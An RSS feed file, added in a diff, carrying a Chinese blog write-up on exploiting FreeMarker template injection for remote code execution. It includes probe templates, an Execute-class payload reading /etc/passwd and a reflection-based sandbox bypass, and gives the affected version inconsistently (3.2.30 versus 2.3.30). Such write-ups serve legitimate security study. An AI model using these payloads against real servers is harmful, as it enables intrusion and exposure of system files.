@@ -1,0 +1,85 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>FreeMarker on 办公AI智能小助手</title>
+        <link>http://localhost:1313/tags/freemarker/</link>
+        <description>Recent content in FreeMarker on 办公AI智能小助手</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>zh-cn</language>
+        <copyright>qife</copyright><atom:link href="http://localhost:1313/tags/freemarker/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>突破壁垒：FreeMarker模板引擎中的SSTI漏洞实现远程代码执行</title>
+        <link>http://localhost:1313/p/%E7%AA%81%E7%A0%B4%E5%A3%81%E5%9E%92freemarker%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E4%B8%AD%E7%9A%84ssti%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</link>
+        <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+        
+        <guid>http://localhost:1313/p/%E7%AA%81%E7%A0%B4%E5%A3%81%E5%9E%92freemarker%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E4%B8%AD%E7%9A%84ssti%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</guid>
+        <description>&lt;img src="https://miro.medium.com/max/1200/1*QJZ6W-Pck_W7RlIDwUIN9Q.jpeg" alt="Featured image of post 突破壁垒：FreeMarker模板引擎中的SSTI漏洞实现远程代码执行" /&gt;&lt;h1 id=&#34;突破壁垒freemarker模板引擎中的ssti漏洞实现远程代码执行&#34;&gt;突破壁垒：FreeMarker模板引擎中的SSTI漏洞实现远程代码执行
+&lt;/h1&gt;&lt;p&gt;2023年，我在使用旧版FreeMarker模板引擎的应用中发现了一个重大漏洞。该版本存在服务器端模板注入(SSTI)漏洞，使我能够实现远程代码执行(RCE)。报告问题后，公司立即实施了沙箱机制来缓解SSTI攻击风险。但由于仍在使用FreeMarker 3.2.30以下版本，存在已知的沙箱绕过漏洞。本文将深入分析这一发现，重点展示绕过沙箱机制的具体步骤。&lt;/p&gt;
+&lt;h2 id=&#34;freemarker模板引擎工作原理&#34;&gt;FreeMarker模板引擎工作原理
+&lt;/h2&gt;&lt;p&gt;FreeMarker是一款广泛采用的模板引擎，主要用于Java应用中将表现逻辑与业务逻辑分离。它允许开发者创建包含静态内容和动态占位符的模板，这些模板可以通过Java对象或数据库查询等数据源填充，最终生成动态输出。&lt;/p&gt;
+&lt;p&gt;HTML转PDF的工作流程如下：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;HTML结构定义&lt;/strong&gt;：在FreeMarker模板文件中定义HTML结构，包括内容、格式和样式&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;FreeMarker指令&lt;/strong&gt;：使用&lt;code&gt;&amp;lt;#&lt;/code&gt;开头的指令动态填充数据，包括集合遍历、条件渲染和变量访问&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;指令块&lt;/strong&gt;：在指令中定义可条件执行或循环的代码块&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;HTML渲染&lt;/strong&gt;：将模板与数据合并生成最终HTML&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;PDF转换&lt;/strong&gt;：使用HTML转PDF工具将生成的HTML转为PDF文档&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;漏洞发现过程&#34;&gt;漏洞发现过程
+&lt;/h2&gt;&lt;p&gt;在应用测试阶段，我观察到&lt;code&gt;&amp;lt;#if&amp;gt;&lt;/code&gt;、&lt;code&gt;&amp;lt;#list&amp;gt;&lt;/code&gt;等标签的使用，确认应用使用了FreeMarker引擎。通过以下测试代码验证了引擎行为：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;#assign test = .version&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;TEST FOR SSTI: ${3*3}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这些测试验证了引擎对特殊字符的处理、变量声明和基础运算能力。接着使用以下代码确认引擎版本：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;#assign freemarkerVersion = .version&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;FreeMarker version: ${freemarkerVersion}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;确认版本低于2.3.30，存在SSTI漏洞(CVE-2021-25770)。&lt;/p&gt;
+&lt;h2 id=&#34;漏洞利用&#34;&gt;漏洞利用
+&lt;/h2&gt;&lt;p&gt;&lt;code&gt;freemarker.template.utility.Execute&lt;/code&gt;类允许在模板中执行外部命令。构造如下payload可读取&lt;code&gt;/etc/passwd&lt;/code&gt;文件：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;${&amp;#34;freemarker.template.utility.Execute&amp;#34;?new()(&amp;#34;cat /etc/passwd&amp;#34;)}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;公司随后引入了沙箱环境作为防护措施。沙箱限制了模板引擎的操作能力，提供了安全执行环境。但旧版本仍存在绕过可能。&lt;/p&gt;
+&lt;h2 id=&#34;沙箱绕过技术&#34;&gt;沙箱绕过技术
+&lt;/h2&gt;&lt;p&gt;验证特殊字符处理和运算能力后，构建绕过payload：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#assign classloader=article.class.protectionDomain.classLoader&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#assign owc=classloader.loadClass(&amp;#34;freemarker.template.ObjectWrapper&amp;#34;)&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#assign dwf=owc.getField(&amp;#34;DEFAULT_WRAPPER&amp;#34;).get(null)&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#assign ec=classloader.loadClass(&amp;#34;freemarker.template.utility.Execute&amp;#34;)&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dwf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;newInstance&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ec&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;cat /etc/passwd&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;该payload通过反射获取类加载器，加载关键类并最终执行命令，成功绕过沙箱防护。&lt;/p&gt;
+</description>
+        </item>
+        
+    </channel>
+</rss>
